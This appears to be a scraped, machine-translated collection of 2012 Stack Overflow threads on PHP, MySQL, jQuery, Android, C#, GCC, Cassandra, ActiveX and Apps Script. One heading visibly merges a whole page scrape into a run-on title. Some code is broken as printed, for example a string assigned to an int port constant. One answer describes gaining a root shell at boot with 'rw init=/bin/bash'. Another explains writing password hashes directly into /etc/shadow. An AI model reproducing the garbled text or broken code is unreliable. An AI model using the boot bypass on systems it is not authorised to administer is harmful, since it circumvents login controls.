        'next' => 'http://'.$_SERVER['HTTP_HOST'].$_SERVER['REQUEST_URI']
    );
    $login_url = $facebook->getLoginUrl($login_url_params);

    //redirect to the login URL on facebook
    header("Location: {$login_url}");
    exit();
}

?> 
```

但它没有返回到我的重定向 URL，Firefox 显示以下错误

```
Firefox has detected that the server is redirecting the request for this address in a way that will never complete.

    This problem can sometimes be caused by disabling or refusing to accept
    cookies. 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-06-28T11:54:32.933

而不是使用

```
 //redirect to the login URL on facebook
header("Location: {$login_url}"); 
```

尝试使用：

```
echo "<script type='text/javascript'>top.location.href = '$loginUrl';</script>"; 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-06-28T14:44:51.253

您可以将登录和身份验证过程放在另一个文件中，例如**login.php** 然后当您需要进行身份验证时，然后`include_once "login.php";`从您的应用程序中使用。 **替换你的应用命名空间。**

```
 <?php
//login.php
require 'lib/facebook.php';
require 'lib/fbconfig.php';

if (isset($_GET['code'])){
        header("Location:http://apps.facebook.com/your-app-namespace");
        exit;
    }
$user=null;

//Facebook Authentication part
    $user       = $facebook->getUser();
    // We may or may not have this data based 
    // on whether the user is logged in.
    // If we have a $user id here, it means we know 
    // the user is logged into
    // Facebook, but we don’t know if the access token is valid. An access
    // token is invalid if the user logged out of Facebook.

    $loginUrl   = $facebook->getLoginUrl(
            array(
                'scope'         => 'email,read_mailbox,publish_stream,user_birthday,user_location,read_stream,user_work_history,user_about_me,user_hometown'
            )
    );

    if ($user) {
      try {
        // Proceed knowing you have a logged in user who's authenticated.
        $user_profile = $facebook->api('/me');
      } catch (FacebookApiException $e) {
        //you should use error_log($e); instead of printing the info on browser
        d($e);  // d is a debug function defined at the end of this file
        $user = null;
      }
    }

    if (!$user) {
        echo "<script type='text/javascript'>top.location.href = '$loginUrl';</script>";
        exit;
    }

    //get user basic description
    $userInfo           = $facebook->api("/$user");

    function d($d){
        echo '<pre>';
        print_r($d);
        echo '</pre>';
    }

?> 
```

# linux - 从脚本更改root密码

> ID：11243301
> 
> 赞同：5
> 
> 时间：2012-06-28T11:07:18.227
> 
> 标签：linux, bash, shell, passwords

我正在寻找一种方法来通过 bash 脚本更改 Linux 系统上的 root 用户密码，而无需启动系统。到目前为止，我发现的唯一事情是删除密码或使用我不喜欢使用的 chroot。
我知道如何清空 root 密码，但我需要将其更改为脚本前面定义的不同密码。
我对整个文件系统具有 root 访问权限。
系统正在使用影子密码，有没有办法在不登录/chrooting 的情况下生成加密的影子密码？
还有其他方法可以从脚本更改 root 密码吗？

* * *

## 回答 #1

> 赞同：8
> 
> 时间：2012-06-28T11:58:01.487

密码哈希在`/etc/shadow`. 您可以简单地用生成的（加盐的）哈希替换它。密码哈希的格式在**crypt(3)**中描述。默认值为 DES，但在 glibc2 系统上，它可以包含几种不同的加密方法之一：

```
ID  | Method
---------------------------------------------------------
1   | MD5
2a  | Blowfish (not in mainline glibc; added in some
    | Linux distributions)
5   | SHA-256 (since glibc 2.7)
6   | SHA-512 (since glibc 2.7) 
```

所以影子密码字符串可能如下所示：`$5$saltysalt$KhboodWTnuXJ5siXvWx5mxYXbnuNJOxROfD1inCILfD`

在这种情况下，第一个**$5$**部分表示它是 SHA-256 哈希，中间部分是盐，其余部分是实际哈希。

要生成一个，最好使用系统的 crypt(3) 函数，例如使用最小的 C 程序：

```
#include <stdio.h>
#include <crypt.h>

int main(int argc, char *argv[]) {
        printf("%s\n", crypt(argv[1], argv[2]));
} 
```

编译`cc mkpass.c -o mkpass -lcrypt`然后使用明文密码和盐字符串运行以生成可以放入的字符串`/etc/shadow`：

```
./mkpass yourpassword yoursalt                   # DES (default)
./mkpass yourpassword '$6$yoursalt$encrypted'    # SHA-512 (quote your $) 
```

较旧的 Linux 系统可能不支持第二种形式。最好查看影子文件中的现有字符串并使用相同的哈希类型（来自顶部的 $id$ 列表）。

* * *

## 回答 #2

> 赞同：-1
> 
> 时间：2015-04-02T08:07:26.370

按`e`操作系统选择菜单屏幕中的 Ubuntu 选项卡。更新命令如下

```
rw init=/bin/bash 
```

它会丢弃你的 linux root shell。只需输入名为 passwd root 的命令即可更改您的 root 密码。

# mysql - mySQL 查询不会返回结果等于日期

> ID：11243311
> 
> 赞同：0
> 
> 时间：2012-06-28T11:08:15.163
> 
> 标签：mysql, date

下面应该找到我的选民 ID 和日期。由于某种原因，它无法识别日期并且不会匹配其中任何一个。

```
SELECT * 
FROM  `voting_intention` 
WHERE  `elector` =  '119'
AND  `election_date` =  '05-07-2012'
LIMIT 0 , 30 
```

为什么会这样以及我们如何解决它。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-06-28T11:10:15.557

试试这个

```
SELECT * 
FROM  `voting_intention` 
WHERE  `elector` =  '119'
AND  `election_date` =  '2012-07-05'
LIMIT 0 , 30 
```

日期格式应该是`yyyy-mm-dd`

## 更新 1

根据您的更新，数据类型`election_date`为`varchar`.

如果您的日期格式一致，请`yyyy-mm-dd`使用上述查询。

如果其格式为，`dd-mm-yyyy`那么您的查询应该可以工作。

您将需要根据您拥有的格式调整条件。

```
SELECT * 
FROM  `voting_intention` 
WHERE  `elector` =  '119'
AND  `election_date` =  'dateFormat'
LIMIT 0 , 30 
```

***for date 的缺点`varchar`是当你的条件是 >、>=、<、<= 时你无法获取数据。***

*对于日期，始终使用**[时间戳](http://dev.mysql.com/doc/refman/5.0/en/timestamp-initialization.html)**。*

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-06-28T11:27:19.793

数据库中可能有一些不可见的字符，如 \r 或 \n 或空格......首先检查一下。尝试使用[trim](http://dev.mysql.com/doc/refman/5.1/en/string-functions.html#function_trim)确保字符被删除：

```
SELECT * 
FROM  `voting_intention` 
WHERE  `elector` =  '119'
AND  TRIM(election_date) =  '05-07-2012'
LIMIT 0 , 30 
```

# jquery - jQuery slideUp 仅适用于第一个元素

> ID：11243312
> 
> 赞同：-2
> 
> 时间：2012-06-28T11:08:15.743
> 
> 标签：jquery, slideup

我有一个问题`slideUp`。只有一个元素（第一个）向上滑动。请帮我一把。谢谢。下面是代码：

```
$(document).ready(function() {
    $('#load').hide();
});
$(function() {
    $("#del").click(function() {
        $('#load').fadeIn();
        $(this).parent().slideUp('slow', function() {$(this).remove();});
        $('#load').fadeOut();
    });
}); 
```

这是标记：

```
<div id="container">
    <table>
        <div id="load" align="center"><img src="images/loading.gif" width="28" height="28"     align="absmiddle"/> loading...</div>
        <tr><td>    
            <span>Ashley Ford</span><br/></td>  
            <td><a href="#" id="del">x</a>  
        </td></tr>
        <tr><td>
            <span>Ashley Ford</span><br/></td>
            <td><a href="#" id="del">x</a>
        </td></tr>
        <tr><td>
            <span>Ashley Ford</span><br/></td>
            <td><a href="#" id="del">x</a>
        </td></tr>  
    </table>
</div> 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-06-28T11:10:44.227

[来自ID 选择器](http://api.jquery.com/id-selector/)的 jQuery 文档（添加了重点）：

> 如果为多个元素分配了相同的 ID，则使用该 ID 的查询将仅选择DOM 中**第一个匹配的元素**。

您可以更改`#del`元素以使用类名（或其他一些常见特征）：

```
<a href="#" class="del">x</a> 
```

并相应地修改您的选择器：

```
$(".del").click(function() {
    //Do stuff
}); 
```

* * *

附带说明一下，您有两个函数将在 DOM 就绪时执行。您可以将它们合二为一。只需将其移动`$('#load').hide();`到其他 DOM 就绪事件处理程序中。

并且将 a`div`作为元素的子`table`元素是无效的 HTML。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-06-28T11:11:31.307

您不能`id`对多个元素拥有相同的元素..因为您必须使用`class` 1.Change your `id="del"`to `class="del"` 2.Try this function

```
 $(function() {
      $(".del").click(function() {
      $('#load').fadeIn();
      $(this).parent().slideUp('slow', function() {$(this).remove();});
    $('#load').fadeOut();

    });
     }); 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-06-28T11:11:27.643

正如其他人所说，每个元素`id`都应该是唯一的。如果您需要对一堆元素进行分组，这就是元素`class`的用途。

# android - 从布局 xml 文件中旋转 ImageView 源

> ID：11243314
> 
> 赞同：53
> 
> 时间：2012-06-28T11:08:18.540
> 
> 标签：android, layout, rotation, imageview

我的布局中有这个 ImageView：

```
<ImageView android:layout_width="fill_parent"
        android:layout_height="wrap_content"
        android:contentDescription="@string/image_divider"
        android:paddingBottom="8dp"
        android:paddingTop="4dp"
        android:scaleType="fitXY"
        android:src="@android:drawable/divider_horizontal_textfield" /> 
```

这是一个水平分隔线。我想将它旋转 90 度，所以我有一个垂直分隔线。
有没有可能从布局而不是 Activity 类中做到这一点？

* * *

## 回答 #1

> 赞同：169
> 
> 时间：2012-06-28T11:10:32.253

您可以使用自**API 级别 11起可用**

```
android:rotation="90" 
```

最终代码，

```
<ImageView android:layout_width="fill_parent"
        android:layout_height="wrap_content"
        android:rotation="90"
        android:contentDescription="@string/image_divider"
        android:paddingBottom="8dp"
        android:paddingTop="4dp"
        android:scaleType="fitXY"
        android:src="@android:drawable/divider_horizontal_textfield" /> 
```

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2018-09-02T19:34:07.697

在 ImageView 添加“id”（如果不生成自动）：

```
 android:id="@+id/imageView" 
```

并使用“id”（kotlin 示例）：

```
val imageView = findViewById<ImageView>(R.id.imageView)
imageView.setRotation(90f) // rotate 90 degree 
```

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-06-28T11:48:24.147

您可以通过创建一个新的位图对象在您的代码中做到这一点。看看这个：[http](http://android-er.blogspot.fr/2010/07/rotate-bitmap-image-using-matrix.html) ://android-er.blogspot.fr/2010/07/rotate-bitmap-image-using-matrix.html 特别是这个功能

```
Matrix matrix = new Matrix();
matrix.postScale(curScale, curScale);
matrix.postRotate(curRotate);

Bitmap resizedBitmap = Bitmap.createBitmap(bitmap, 0, 0, bmpWidth, bmpHeight, matrix, true);
myImageView.setImageBitmap(resizedBitmap); 
```

# c# - 使用 C# 检索 Yahoo 电子邮件详细信息

> ID：11243325
> 
> 赞同：-1
> 
> 时间：2012-06-28T11:08:59.963
> 
> 标签：c#, pop3

我正在尝试使用 C# 在我的 Yahoo 帐户上检索邮件。我测试了 OpenPop 来做到这一点，我写的是

```
Pop3Client objClient = new Pop3Client();
objClient.Connect("pop.mail.yahoo.com", 995, true);
objClient.Authenticate("username","pass",AuthenticationMethod.UsernameAndPassword);
int msgCount = objClient.GetMessageCount();
MessageBox.Show(msgCount.ToString()); 
```

服务器始终不接受用户凭据但我确定凭据正常的问题。

我用我的 gmail 帐户尝试了相同的代码，一切正常，雅虎希望我设置它吗？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-09-27T09:57:27.497

为了通过电子邮件程序访问 Yahoo 邮件，您需要成为 Yahoo Mail Plus 订阅者。

```
1\. Sign in to Yahoo Mail.
2\. Move your cursor over the gear icon (Gear Icon) and select Mail Options.
3\. Select POP & Forwarding.
- The "Access your Yahoo Mail elsewhere" option displays.
4\. Select the radio button next to Access Yahoo Mail via POP.
5\. Click Save. 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-06-28T12:42:29.597

试试下面的代码：

```
try
 {
    if (pop3Client.Connected)
        pop3Client.Disconnect();

    pop3Client.Connect("pop.mail.yahoo.com", 995, true);
    pop3Client.Authenticate("your@yahoo.com", "yourpassword");
    int count = pop3Client.GetMessageCount();
}
catch (InvalidLoginException)
{
   //MessageBox.Show(this, "The server did not accept the user credentials!", "POP3 Server Authentication");
}
catch (PopServerNotFoundException)
{
   //MessageBox.Show(this, "The server could not be found", "POP3 Retrieval");
}
catch (PopServerLockedException)
{
   //MessageBox.Show(this, "The mailbox is locked. It might be in use or under maintenance. Are you connected elsewhere?", "POP3 Account Locked");
}
catch (LoginDelayException)
{
   //MessageBox.Show(this, "Login not allowed. Server enforces delay between logins. Have you connected recently?", "POP3 Account Login Delay");
}
catch (Exception e)
{
   //MessageBox.Show(this, "Error occurred retrieving mail. " + e.Message, "POP3 Retrieval");
} 
```

# expression - 如何读取 rdlc 中的控制/变量值？

> ID：11243333
> 
> 赞同：0
> 
> 时间：2012-06-28T11:09:31.847
> 
> 标签：expression, rdlc

我想将值从 aspx 页面上的下拉列表显示到 rdlc 标题。我怎么能做到这一点。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-09-10T22:46:40.610

为您的报告创建一个文本参数以接受该值，然后在您的报告标题中添加一个标签并输入一个表达式，例如`=Parameters!TheDropDownText.Value`其值；您需要在运行报告时提供报告参数的值，但这是另一个主题:)

# html - 比它的孩子高

> ID：11243337
> 
> 赞同：4
> 
> 时间：2012-06-28T11:09:37.693
> 
> 标签：html, css, height, positioning

* * *

## 回答 #1

> 赞同：16
> 
> 时间：2012-06-28T11:12:01.413

确保`img`显示为块元素。

```
a#banner-image img {
    display: block;
} 
```

正如@Ianzz 正确指出的那样，这是因为所有内联元素的下行空间存在问题。

# c++ - gcc 中的 Intel 风格的内联汇编

> ID：11243340
> 
> 赞同：5
> 
> 时间：2012-06-28T11:09:50.560
> 
> 标签：c++, gcc, assembly, intel

我正在尝试使用 gcc 编译器在 Code::Blocks 中编译一个旧的 C++ 软件项目，在修复了一些其他问题之后，我碰壁了：该项目有一个英特尔风格的内联 ASM 文件，写为

```
_asm {
  code here
} 
```

并且编译器拒绝使用“错误：'_asm'未在此范围内声明”进行编译。

我花了一段时间谷歌搜索寻找解决方案，但我唯一能找到的就是添加`-masm=intel`到构建选项（我已经尝试过但无法工作），或者将代码转换为`asm ("code here");`（由于 ASM 的数量庞大，这是不可行的）。有谁知道我怎样才能让 gcc 按原样编译这段代码，还是我应该放弃并使用不同的编译器？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-06-28T11:26:56.997

GCC 对内联汇编器使用[非常不同的语法](http://www.ibiblio.org/gferg/ldp/GCC-Inline-Assembly-HOWTO.html)，因此您将无法通过微不足道的更改来处理它。我看到以下选项：

1.  用 GCC 语法或 C 代码重写所有内容
2.  制作一些脚本以转换为 GCC 语法（不平凡的任务）
3.  使用为它编写的任何编译器编译代码（MSVC？）

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-06-28T14:13:38.657

您根本无法让 gcc “按原样”编译代码。如果你需要使用 gcc 编译这个东西，你必须用 C++ 或 gcc 兼容的 asm 重写代码。如果确实有很多汇编代码——比如说，200 条或更多指令——那么学习 gcc 汇编语法可能是值得的；如果没有，请用 C++ 编写代码。

# cassandra - 无法使用 Hector 连接到 cassandra

> ID：11243342
> 
> 赞同：1
> 
> 时间：2012-06-28T11:09:59.593
> 
> 标签：cassandra, hector

我无法使用 Hector 访问 Casandra。以下是代码

```
 import java.util.Arrays;
 import java.util.List;
 import me.prettyprint.cassandra.service.CassandraHostConfigurator;
 import me.prettyprint.cassandra.service.ThriftCluster;
 import me.prettyprint.cassandra.service.ThriftKsDef;
 import me.prettyprint.hector.api.Cluster;
 import me.prettyprint.hector.api.Keyspace;
 import me.prettyprint.hector.api.ddl.ColumnFamilyDefinition;
 import me.prettyprint.hector.api.ddl.KeyspaceDefinition;
 import me.prettyprint.hector.api.factory.HFactory;
 import me.prettyprint.hector.api.mutation.Mutator;

 public class Hector {
 public static void main (String[] args){
boolean cfExists = false;
Cluster cluster = HFactory.getOrCreateCluster("mycluster", new                     CassandraHostConfigurator("host:9160"));
Keyspace keyspace = HFactory.createKeyspace("Keyspace1", cluster);
// first check if the key space exists
        KeyspaceDefinition keyspaceDetail = cluster.describeKeyspace("Keyspace1");
        // if not, create one
        if (keyspaceDetail == null) {

            CassandraHostConfigurator cassandraHostConfigurator = new CassandraHostConfigurator("host:9160");
            ThriftCluster cassandraCluster = new ThriftCluster("mycluster", cassandraHostConfigurator);

            ColumnFamilyDefinition cfDef = HFactory.createColumnFamilyDefinition("Keyspace1", "base");
            cassandraCluster.addKeyspace(new ThriftKsDef("Keyspace1", "org.apache.cassandra.locator.SimpleStrategy", 1,
                    Arrays.asList(cfDef)));

        } else {

            // even if the key space exists, we need to check if the column family exists
            List<ColumnFamilyDefinition> columnFamilyDefinitions = keyspaceDetail.getCfDefs();
            for (ColumnFamilyDefinition def : columnFamilyDefinitions)    {
                String columnFamilyName = def.getName();
                if (columnFamilyName.equals("tcs_im"))
                    cfExists = true;
            }
        }
 }
 } 
```

遇到以下错误

log4j:WARN 找不到记录器的附加程序（me.prettyprint.cassandra.connection.CassandraHostRetryService）。log4j:WARN 请正确初始化 log4j 系统。log4j:WARN 见[http://logging.apache.org/log4j/1.2/faq.html#noconfig](http://logging.apache.org/log4j/1.2/faq.html#noconfig)了解更多信息。线程“主”java.lang.IllegalAccessError 中的异常：试图从 me.prettyprint.cassandra.connection.HConnectionManager.(HConnectionManager. java:78) 在 me.prettyprint.cassandra.service.AbstractCluster.(AbstractCluster.java:69) 在 me.prettyprint.cassandra.service.AbstractCluster.(AbstractCluster.java:65) 在 me.prettyprint.cassandra.service.ThriftCluster .(ThriftCluster.java:17) 在 me.prettyprint.hector.api.factory.HFactory.createCluster(HFactory.java:176) 在 me.prettyprint.hector.api.factory.HFactory.getOrCreateCluster(HFactory.java:155)在 com.im.tcs.Hector.main(Hector.java:20)

请帮忙看看为什么会这样。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-06-30T12:36:14.773

我们使用 CassandraConnection 类作为便利类：

```
import me.prettyprint.cassandra.connection.DynamicLoadBalancingPolicy;
import me.prettyprint.cassandra.service.CassandraHostConfigurator;
import me.prettyprint.cassandra.service.ExhaustedPolicy;
import me.prettyprint.cassandra.service.OperationType;
import me.prettyprint.hector.api.Cluster;
import me.prettyprint.hector.api.HConsistencyLevel;
import me.prettyprint.hector.api.Keyspace;
import me.prettyprint.hector.api.factory.HFactory;

import java.util.HashMap;
import java.util.Map;

/**
 * lazy connect
 */
final class CassandraConnection {

    // Constants -----------------------------------------------------

    private static final String HOSTS = "localhost";
    private static final int PORT = "9160";
    private static final String CLUSTER_NAME = "myCluster";
    private static final int TIMEOUT = 500);
    private static final String KEYSPACE = "Keyspace1";
    private static final ConsistencyLevelPolicy CL_POLICY = new ConsistencyLevelPolicy();

    // Attributes ----------------------------------------------------

    private Cluster cluster;
    private volatile Keyspace keyspace;

    // Constructors --------------------------------------------------

    CassandraConnection() {}

    // Methods --------------------------------------------------------

    Cluster getCluster() {
        if (null == cluster) {
            CassandraHostConfigurator config = new CassandraHostConfigurator();
            config.setHosts(HOSTS);
            config.setPort(PORT);
            config.setUseThriftFramedTransport(true);
            config.setUseSocketKeepalive(true);
            config.setAutoDiscoverHosts(false);
            // maxWorkerThreads provides the throttling for us. So hector can be let to grow freely...
            config.setExhaustedPolicy(ExhaustedPolicy.WHEN_EXHAUSTED_GROW);
            config.setMaxActive(1000); // hack since ExhaustedPolicy doesn't work
            // suspend hosts if response is unacceptable for web response
            config.setCassandraThriftSocketTimeout(TIMEOUT);
            config.setUseHostTimeoutTracker(true);
            config.setHostTimeoutCounter(3);
            config.setLoadBalancingPolicy(new DynamicLoadBalancingPolicy());

            cluster = HFactory.createCluster(CLUSTER_NAME, config);

        }
        return cluster;
    }

    Keyspace getKeyspace() {
        if (null == keyspace) {
            keyspace = HFactory.createKeyspace(KEYSPACE, getCluster(), CL_POLICY);
        }
        return keyspace;
    }

    private static class ConsistencyLevelPolicy implements me.prettyprint.hector.api.ConsistencyLevelPolicy {

        @Override
        public HConsistencyLevel get(final OperationType op) {
            return HConsistencyLevel.ONE;
        }

        @Override
        public HConsistencyLevel get(final OperationType op, final String cfName) {
            return get(op);
        }
    }
} 
```

使用示例：

```
private final CassandraConnection conn = new CassandraConnection();

SliceQuery<String, String, String> sliceQuery = HFactory.createSliceQuery(
                conn.getKeyspace(), StringSerializer.get(), StringSerializer.get(), StringSerializer.get());
sliceQuery.setColumnFamily("myColumnFamily");
sliceQuery.setRange("", "", false, Integer.MAX_VALUE);
sliceQuery.setKey("myRowKey");
ColumnSlice<String, String> columnSlice = sliceQuery.execute().get(); 
```

# javascript - 我如何检查是否 failed to load? I have the following code: document.getElementById("launcherDiv").innerHTML = ""; Let say the download/installing failed, How can I know this? depending of it that I can't know how much time it supposed to take.. If I will check in a loop how can I know when to end? previously I used to define the tag inside the HTML and it waiting until the installation finished or failed. But now I need delay loading of this ActiveX so I can't use this Can anyone help me? How do I get the mouse position in FireFox? This code works in Google Chrome and IE but not in FireFox. function drawChildren(names) { var c = document.getElementById("myCanvas"); var ctx = c.getContext("2d"); var ctxcolor = "#000000"; if(listeners < 1){ c.addEventListener("click", getPosition, false); listeners = 1; } // At the click function "getPosition" is executed } function getPosition(event) { if ( event.offsetX == null ) { // Firefox clickedX = event.layerX; clickedY = event.layerY; } else { // Other browsers clickedX = event.offsetX; clickedY = event.offsetY; } checkCoordinates(clickedX, clickedY); } javascripthtmlactivex 4 4 回答 4 This answer is useful 4 如果对象标签加载失败，那么它将在标签之间呈现内部 HTML。例如 Object not supported 如果对象失败，那么它将显示内部文本，即“对象不支持” 于 2014-12-05T07:36:21.613 回答 This answer is useful 0 I know this is a old post but I was trying something like this my self. In the object tag you can do something else inside it. For example I was making a music site and If the custom player didnt load I wanted the audio tag to take over. example:<load customplayer="">load song</load>于 2013-06-22T13:12:24.753 回答 This answer is useful 0 也许这有帮助： var iv = setInterval(function () { if (document.all["launcher"].readyState == 4) { clearInterval(iv) alert("Object loaded") } }, 100); 它所做的是设置一个间隔，每 100 秒检查一次就绪状态，如果对象已加载，它会发出警报。 于 2012-06-28T11:24:11.873 回答 This answer is useful 0 成功加载嵌入内容的对象中的（第一个）锚点与未成功加载的对象中的后备内容（第一个）锚点之间的唯一区别是元素的尺寸。因此，您所要做的就是确定您用于后备的元素的策略（这很可能是一个锚元素，尽管有些人可能仍然支持 Flash 作为后备内容），然后定位该元素并在示例中获取它；如果高度大于 0，则对象元素未成功加载。height var o = document.getElementsByTagName('object'); console.log(o[0].getElementsByTagName('a')[0].getBoundingClientRect().height); 于 2015-05-27T19:34:11.840 回答 Related 2 iphone - Xcode：更新时无法启动应用程序 0 android - 如果其中没有项目，则不会显示 ListViews 背景？ 1 python - Scrapy：如何构建一个从多个 URL 收集信息的项目？ 4 java - 第一个 tomcat 应用程序 - 'ant install' 错误“NoClassDefFound” 1 architecture - 多媒体数据内容管理系统架构需求建议 3 javascript - 嵌套 JavaScript 对象 7 c++ - 是否依赖于 C++ 平台？ 2 ruby-on-rails - 如何使用设计：可记忆？ 1 package - 我在哪里可以下载原始 java 包并添加到我的项目中？ 0 c++ - C++/AS3 winsock send() 不会在 else if 语句中写入 Reference php × 1429865 c/c++ × 756500 nginx × 49975 mongodb × 159057 mybatis × 3233 anaconda × 13410 pycharm × 14671 python × 1902243 vscode × 56040 docker × 110988 github × 49000 flask × 49129 ffmpeg × 24037 jmeter × 16910 matplotlib × 63493 bootstrap × 54641

> ID：11243343
> 
> 赞同：2
> 
> 时间：
> 
> 标签：javascript, html, activex

I have the following code:

```
document.getElementById("launcherDiv").innerHTML = 
"<object id='launcher' 
classid='CLSID:17E88883-3488-46B8-BE4D-30568888855' 
codebase='Helper.CAB#version=8,8,8,88'>
</object>"; 
```

Let say the download/installing failed,
How can I know this? depending of it that I can't know how much time it supposed to take..

If I will check in a loop how can I know when to end?

previously I used to define the tag inside the HTML and it waiting until the installation finished or failed.
But now I need delay loading of this ActiveX so I can't use this

Can anyone help me?

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2014-12-05T07:36:21.613

如果对象标签加载失败，那么它将在标签之间呈现内部 HTML。例如

```
<object data="my/file/path.pdf">Object not supported</object> 
```

如果对象失败，那么它将显示内部文本，即“对象不支持”

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-06-22T13:12:24.753

I know this is a old post but I was trying something like this my self. In the object tag you can do something else inside it. For example I was making a music site and If the custom player didnt load I wanted the audio tag to take over.

example:

```
<object>
    <load customplayer> <!--==If this fails do the next line ==-->
          <audio>
                load song
          </audio>
</object> 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-06-28T11:24:11.873

也许这有帮助：

```
 var iv = setInterval(function () {
    if (document.all["launcher"].readyState == 4) {
    clearInterval(iv)
    alert("Object loaded")
    }
    }, 100); 
```

它所做的是设置一个间隔，每 100 秒检查一次就绪状态，如果对象已加载，它会发出警报。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2015-05-27T19:34:11.840

*成功加载嵌入内容的对象中的（第一个）锚点与未成功加载的对象中的***后备内容**（第一个）锚点之间的唯一区别是元素的尺寸。因此，您所要做的就是确定您用于后备的元素的策略（这很可能是一个锚元素，尽管有些人可能仍然支持 Flash 作为后备内容），然后定位该元素并在示例中获取它；**如果高度大于 0，则对象元素未成功加载**。*`height`*

 ***```
var o = document.getElementsByTagName('object');
console.log(o[0].getElementsByTagName('a')[0].getBoundingClientRect().height); 
```***

# javascript - 如何在 FireFox 中获取鼠标位置？

> ID：11243344
> 
> 赞同：-1
> 
> 时间：2012-06-28T11:10:07.960
> 
> 标签：javascript, html, mouseevent

此代码适用于 Google Chrome 和 IE，但不适用于 FireFox。

```
function drawChildren(names) {
    var c = document.getElementById("myCanvas");
    var ctx = c.getContext("2d");       
    var ctxcolor = "#000000";

    if(listeners < 1){
        c.addEventListener("click", getPosition, false);
        listeners = 1;
    } // At the click function "getPosition" is executed
}

function getPosition(event) {

    if ( event.offsetX == null ) { // Firefox
        clickedX = event.layerX;
        clickedY = event.layerY;
    } else {                       // Other browsers
        clickedX = event.offsetX;
        clickedY = event.offsetY;
    }

    checkCoordinates(clickedX, clickedY);  
} 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-07-02T21:35:59.223

要回答您在上述评论中发布的问题，只要单击，您`function getPosition()`就会被调用。`myCanvas`（因为你的代码说`c.addEventListener("click", getPosition, false);`）

使用您的鼠标位置检测代码，我也不确定偏移和分层是如何工作的，但是如果您使用以下代码，那么我知道您将始终从浏览器的边缘开始获取 x 和 y 坐标，而不是开始在您网站的任何元素中：

```
if(evt.pageX){
    var xPos = evt.pageX;
    var yPos = evt.pageY;
}else if(evt.clientX){
    var xPos = evt.clientX + ((document.documentElement.scrollLeft) ? document.documentElement.scrollLeft : document.body.scrollLeft);
    var yPos = evt.clientY + ((document.documentElement.scrollTop) ? document.documentElement.scrollTop : document.body.scrollTop);
} 
```

您的代码可能与此执行相同的操作，但我只想提供对我有用的内容:)

# c# - 访问嵌入图像并创建 System.Windows.Controls.Image

> ID：11243351
> 
> 赞同：1
> 
> 时间：2012-06-28T11:10:37.257
> 
> 标签：c#, wpf, image

我已设置访问嵌入式资源并返回 System.Drawing.Image 但我不能使用它来设置画布的背景。

有人可以告诉我如何访问嵌入式图像文件并创建 System.Windows.Controls.Image。我到目前为止的代码是：

```
public static Image Load(Type classType, string resourcePath)
        {
            Assembly asm = Assembly.GetAssembly(classType);
            Stream imgStream = asm.GetManifestResourceStream(resourcePath);
            Image img = Image.FromStream(imgStream);
            imgStream.Close();

            return img;
        } 
```

如果您需要更多信息，请告诉我

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-06-28T13:52:57.063

如果您不需要特别使用“System.Drawing.Image”，那么您可以尝试以下操作：

```
 Assembly asm = Assembly.GetCallingAssembly();
        var res = asm.GetManifestResourceNames();
        Stream imgStream = asm.GetManifestResourceStream("path.to.resource");

        BitmapImage image = new BitmapImage();
        image.BeginInit();
        image.StreamSource = imgStream;
        image.EndInit();

        ImageBrush brush = new ImageBrush();
        brush.ImageSource = image;

        imageCanvas.Background = brush; 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-06-28T11:12:59.487

位图 bm = new Bitmap(@"...."); img = bm;

# google-apps-script - 使用谷歌应用脚 本进行 Vlookup 或索引

> ID：11243358
> 
> 赞同：-1
> 
> 时间：2012-06-28T11:10:55.510
> 
> 标签：google-apps-script, google-sheets, gs-vlookup

我有一个电子表格（Sheet1），其中数据从 Col A 到 D 列，在另一张表（Sheet1）中，数据再次从 Col A 到 Col W，其中 Col F 数据与D 列。

**我在寻找什么：**

我想从 Sheet2 中提取数据（从 Col F 开始，即 G、H、I 等）在 Col E 中，依此类推在 Sheet1 中。 **Sheet2** Col

FGHIJKL 1 ABCDEF 2 a1 b1 c1 d1 e1 f1 3 a2 b2 c2 d2 e2 f2 等等

**Sheet1** Col DEFGH 1 ABCD 3 a2 b2 c2 d2

使用 vlookup 或索引，在 sheet2 中的 sheet1 中的 col E、F、GH 中反映 col E、F 中的列 D 的数据。

**我试过但徒劳的** [http://productforums.google.com/forum/#!topic/apps-script/HzeNdIqnIUc](http://productforums.google.com/forum/#!topic/apps-script/HzeNdIqnIUc)

我只想使用谷歌应用程序来获得所需的结果。

请求这方面的帮助。

问候

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-06-28T23:31:32.963

很抱歉，您的 VLOOKUP 有问题，但这是 Google 电子表格用户问题，而不是 stackoverflow（编程）问题。它可能会帮助您了解这些事情：

1.  VLOOKUP 让您走在正确的轨道上。电子表格函数 VLOOKUP 绝对适用于获取 sheet2 中的数据，以根据 sheet1 中的键/列进行查找。它非常适合你说你需要做的事情。
2.  您可以搜索 Google 支持网站： http: [//support.google.com/docs/bin/search.py ​​?query=vlookup](http://support.google.com/docs/bin/search.py?query=vlookup)
3.  您可以在 Google 文档帮助论坛[https://productforums.google.com/forum/#!forum/docs中提问](https://productforums.google.com/forum/#!forum/docs)

祝你好运。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2015-12-23T20:55:17.860

这是一篇旧文章，但其他人可能仍会偶然发现它。

这是我写的以脚本形式解决我的 Vlookup 需求的内容。

```
